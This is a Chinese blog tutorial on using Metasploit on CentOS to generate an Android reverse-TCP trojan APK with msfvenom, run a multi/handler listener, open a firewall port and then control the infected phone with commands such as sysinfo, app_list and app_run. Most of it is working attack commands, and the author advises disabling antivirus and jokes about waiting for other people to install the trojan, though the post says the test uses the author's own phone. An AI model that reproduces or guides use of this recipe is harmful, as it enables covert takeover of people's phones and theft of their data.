---
title: Centos Linux下使用Metasploit渗透android
date: 2019-12-06 17:22:20
tags:
---

### Metasploit是一款开源的安全漏洞检测工具

![markdown](https://p1.ssl.qhimg.com/t0190cd0706efb0b092.jpg "markdown")


Metasploit是一款开源的安全漏洞检测工具，可以帮助安全和IT专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动的安全性进行评估，提供真正的安全风险情报。这些功能包括智能开发，代码审计，Web应用程序扫描，社会工程。


> 这篇文档只适合在Centos Linux已经安装了Metasploit的大伙。没有安装Metasploit的小伙们，可以前往
https://blog.csdn.net/wyvbboy/article/details/51526640
博客去浏览并安装，然后再回来~(如果此博客的安装已经过期了，官方找或者网上找)



看完Metasploit简介后，其下有一个工具msfvenom可以生成木马，打开linux终端，最好登录root，怕出错，然后输入命令

``` bash
$ msfvenom
```

Enter下看看都啥？一大堆指令让你烦~

![markdown](https://images.weserv.nl/?url=https://img2018.cnblogs.com/common/792361/201912/792361-20191207162657719-1141688852.png "markdown")


先查看一下所有类型的攻击负荷（看成木马也行），输入命令

``` bash
$ msfvenom --list payloads
```

Enter下来，数据很多，我们从里面找Android类型的就行，我是来操控手机的，不会干其它的


![markdown](https://images.weserv.nl/?url=https://img2018.cnblogs.com/i-beta/792361/201912/792361-20191207163344769-628933815.png "markdown")

复制一下黄色框的字段，tcp格式的，接下来会用到

> android/meterpreter/reverse_tcp

知道了“木马”的名称，还得知道终端的ip，输入ifconfig查看内网ip（俺的是本地测试的）

``` bash
$ ifconfig
```

![markdown](https://images.weserv.nl/?url=https://img2018.cnblogs.com/i-beta/792361/201912/792361-20191207163426245-963808654.png "markdown")

ip拿到了，还不赶紧的开始生成木木马-_-，msfvenom兄弟，靠你了，输入

``` bash
$ msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.122.129 LPORT=3333 R > first.apk
```

> -p, --payload      <payload>        使用攻击负荷。指定一个'-'或者输入(stdin)用户自定义的payloads(攻击负荷)。
LHOST ip地址
LPORT 自定义端口（注意，那些所谓的防火墙全踏马都要关闭，记得端口要放行且没被占用，不然渗透没软用）

> 生成的木马最好能放在一个可以访问的文件夹上，我直接first.apk，在终端目前路径上可以看到有文件生成。如果没有，那就是失败了，检查一下你的端口是否占用！生成成功的编译大概会出现Payload size: 10181 bytes字段

> ![markdown](https://images.weserv.nl/?url=https://img2018.cnblogs.com/i-beta/792361/201912/792361-20191207163818471-1522645336.png "markdown")

木马生成完毕，msfvenom兄弟的工作就基本完工了，接下来就有请msfconsole上场了，没错，就是打开metasploit的控制台，着手配置相关信息，开始渗透了~

直接输入msfconsole


``` bash
$ msfconsole
```

长久看多了单调代码的你，下面的图形代码有没有让你灰色的世界多点点色彩~~

> ![markdown](https://images.weserv.nl/?url=https://img2018.cnblogs.com/i-beta/792361/201912/792361-20191207163834423-1940779796.png "markdown")

谈正事~我们需要配置什么呢？前面生成木马的时候不是设置了ip和端口吗？现在我们也要在控制台上配置ip和端口，做监听来的<br/>
要做的流程大概是这些


> ![markdown](https://images.weserv.nl/?url=https://img2018.cnblogs.com/i-beta/792361/201912/792361-20191207163902002-1478615007.png "markdown")

（在msfconsole模式下）加载exploit模块


``` bash
msf > use exploit/multi/handler
```

(exploit模式下)选择之前我们粘贴过一次的攻击载荷：android/meterpreter/reverse_tcp


``` bash
msf exploit(multi/handler)> set payload android/meterpreter/reverse_tcp
```

(exploit模式下)查看一下列表有没有多出你设置的载荷


``` bash
msf exploit(multi/handler)> show options
```


(exploit模式下)设置蓝色框下的LHOST和LPORT，就设置成之前生成木马搞的ip和端口


> ![markdown](https://images.weserv.nl/?url=https://img2018.cnblogs.com/i-beta/792361/201912/792361-20191207163952817-212862305.png "markdown")

顺便放行端口，输入命令firewall-cmd --add-port=3333/tcp

> firewall-cmd --add-port=3333/tcp # 开放通过tcp访问3333

配置的流程都搞完了，马上就是渗透了。
群灵觉醒，封印解除，出来吧！exploit
输入命令exploit，开始监控，记住不要关掉，就坐等别人的手机安装，然后别人点击的瞬间，俺这里马上获取到别人手机的控制权，到时候，嘿嘿~。当然，俺这里是渗透自己的手机（然并软~—~）


> ![markdown](https://images.weserv.nl/?url=https://img2018.cnblogs.com/i-beta/792361/201912/792361-20191207164225839-1964069310.png "markdown")


既然是渗透自己的手机，把生成的木马拿出来下载吧，俺这里是ftp连接linux成功后，找到木马下载安装到自己的手机上（杀毒软件请关掉），我用的是xftp，只要你能把那个木马拿出来下载，管你用什么办法~~

> ![markdown](https://images.weserv.nl/?url=https://img2018.cnblogs.com/i-beta/792361/201912/792361-20191207164307971-1673424768.png "markdown")

安装好木马后，点击打开的瞬间，没有啥反应。手机上没反应没关系，关键是终端exploit监听有反应，并且开始渗透并成功。
如果终端没有反应，就是防火墙的问题，设置的端口要放行

输个?，查看命令列表

> ![markdown](https://images.weserv.nl/?url=https://img2018.cnblogs.com/i-beta/792361/201912/792361-20191207164555975-189752411.png "markdown")

比如查看下手机信息


``` bash
sysinfo
```

> ![markdown](https://images.weserv.nl/?url=https://img2018.cnblogs.com/i-beta/792361/201912/792361-20191207164626341-2046848681.png "markdown")

想打开某个应用，输入app_list查看app列表


> ![markdown](https://images.weserv.nl/?url=https://img2018.cnblogs.com/i-beta/792361/201912/792361-20191207164718918-656694583.png "markdown")

然后使用使用app_run命令打开app对应的package名称

> ![markdown](https://images.weserv.nl/?url=https://img2018.cnblogs.com/i-beta/792361/201912/792361-20191207164800100-437753813.png "markdown")

手机上的termux就会自己启动


> ![markdown](https://images.weserv.nl/?url=https://img2018.cnblogs.com/i-beta/792361/201912/792361-20191207164921069-1840035443.png "markdown")

> ![markdown](https://images.weserv.nl/?url=https://img2018.cnblogs.com/i-beta/792361/201912/792361-20191207164927946-1875249291.png "markdown")

好了，还有关于相册或者通讯录、照相什么的指令就不讲了，你们自己探究探究吧





